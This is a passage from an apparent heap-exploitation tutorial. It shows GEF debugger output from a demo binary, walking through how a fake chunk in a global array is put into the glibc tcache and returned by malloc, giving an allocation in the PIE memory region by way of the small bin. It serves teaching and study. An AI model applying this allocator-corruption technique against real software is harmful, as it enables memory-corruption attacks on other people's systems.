$r10   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/small_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf60│+0x0000: 0x0000000800000017   ← $rsp
0x00007fffffffdf68│+0x0008: 0x0000000700000002
0x00007fffffffdf70│+0x0010: 0x000055555555a810  →  0x00007ffff7e2d000  →  0x00007ffff7e2cff0  →  0x00007ffff7e2cfe0  →  0x00007ffff7e2cfd0  →  0x00007ffff7e2cfc0  →  0x00007ffff7e2cfb0
0x00007fffffffdf78│+0x0018: 0x000055555555abb0  →  0x000055500000d50a
0x00007fffffffdf80│+0x0020: 0x000055555555a500  →  0x000055500000f4aa
0x00007fffffffdf88│+0x0028: 0x000055555555a1f0  →  0x000055500000cbba
0x00007fffffffdf90│+0x0030: 0x0000555555559ee0  →  0x000055500000ce89
0x00007fffffffdf98│+0x0038: 0x0000555555559bd0  →  0x000055500000cd99
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552cd <main+324>    mov edi, 0x300
   0x5555555552d2 <main+329>    call   0x555555555090 <malloc@plt>
   0x5555555552d7 <main+334>    mov edi, 0x300
 → 0x5555555552dc <main+339>    call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64
    0x555555555094 <malloc@plt+4>   bnd jmp QWORD PTR [rip+0x2f35]      # 0x555555557fd0 <malloc@got.plt>
    0x55555555509b <malloc@plt+11>  nop DWORD PTR [rax+rax*1+0x0]
    0x5555555550a0 <_start+0>       endbr64
    0x5555555550a4 <_start+4>       xor ebp, ebp
    0x5555555550a6 <_start+6>       mov r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000300
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "small_linked", stopped 0x5555555552dc in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552dc → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$2 = 0x55555555abb0
gef➤  vmmap 0x55555555abb0
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
Tcachebins[idx=47, size=0x310, count=1] ←  Chunk(addr=0x555555558050, size=0x310, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x555555558040
0x555555558040 <long_array>:    0x0 0x311
0x555555558050 <long_array+16>: 0x555555558 0x6b38570d0a3b0522
0x555555558060 <long_array+32>: 0x0 0x0
0x555555558070 <long_array+48>: 0x0 0x0
0x555555558080 <long_array+64>: 0x0 0x0
0x555555558090 <long_array+80>: 0x0 0x0
0x5555555580a0 <long_array+96>: 0x0 0x0
0x5555555580b0 <long_array+112>:    0x0 0x0
0x5555555580c0 <long_array+128>:    0x0 0x0
0x5555555580d0 <long_array+144>:    0x0 0x0
gef➤  
```

Now, the only chunk in the tcache is our fake chunk, let's allocate it:

```
gef➤  c
Continuing.

Breakpoint 5, 0x00005555555552e1 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555558050  →  <long_array+16> pop rax
$rbx   : 0x0             
$rcx   : 0x0             
$rdx   : 0x0000555555559010  →  0x0000000000000000
$rsp   : 0x00007fffffffdf60  →  0x0000000800000017
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x0             
$rdi   : 0x3f            
$rip   : 0x00005555555552e1  →  <main+344> nop
$r8 : 0x2f           
$r9 : 0x0000555555559010  →  0x0000000000000000
$r10   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/small_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf60│+0x0000: 0x0000000800000017   ← $rsp
0x00007fffffffdf68│+0x0008: 0x0000000700000002
0x00007fffffffdf70│+0x0010: 0x000055555555a810  →  0x00007ffff7e2d000  →  0x00007ffff7e2cff0  →  0x00007ffff7e2cfe0  →  0x00007ffff7e2cfd0  →  0x00007ffff7e2cfc0  →  0x00007ffff7e2cfb0
0x00007fffffffdf78│+0x0018: 0x000055555555abb0  →  0x000055500000d50a
0x00007fffffffdf80│+0x0020: 0x000055555555a500  →  0x000055500000f4aa
0x00007fffffffdf88│+0x0028: 0x000055555555a1f0  →  0x000055500000cbba
0x00007fffffffdf90│+0x0030: 0x0000555555559ee0  →  0x000055500000ce89
0x00007fffffffdf98│+0x0038: 0x0000555555559bd0  →  0x000055500000cd99
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552d2 <main+329>    call   0x555555555090 <malloc@plt>
   0x5555555552d7 <main+334>    mov edi, 0x300
   0x5555555552dc <main+339>    call   0x555555555090 <malloc@plt>
 → 0x5555555552e1 <main+344>    nop    
   0x5555555552e2 <main+345>    mov rax, QWORD PTR [rbp-0x8]
   0x5555555552e6 <main+349>    sub rax, QWORD PTR fs:0x28
   0x5555555552ef <main+358>    je  0x5555555552f6 <main+365>
   0x5555555552f1 <main+360>    call   0x555555555080 <__stack_chk_fail@plt>
   0x5555555552f6 <main+365>    leave  
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "small_linked", stopped 0x5555555552e1 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552e1 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$3 = 0x555555558050
gef➤  vmmap 0x555555558050
[ Legend:  Code | Heap | Stack ]
Start           End             Offset          Perm Path
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /Hackery/shogun/pwn_demos/small_bin/linked_list/small_linked
gef➤  x/g 0x555555558050
0x555555558050 <long_array+16>: 0x555555558
gef➤  c
Continuing.
[Inferior 1 (process 99010) exited normally]
```

Just like that, we were able to allocate a chunk to the PIE memory region, leveraging the small bin.
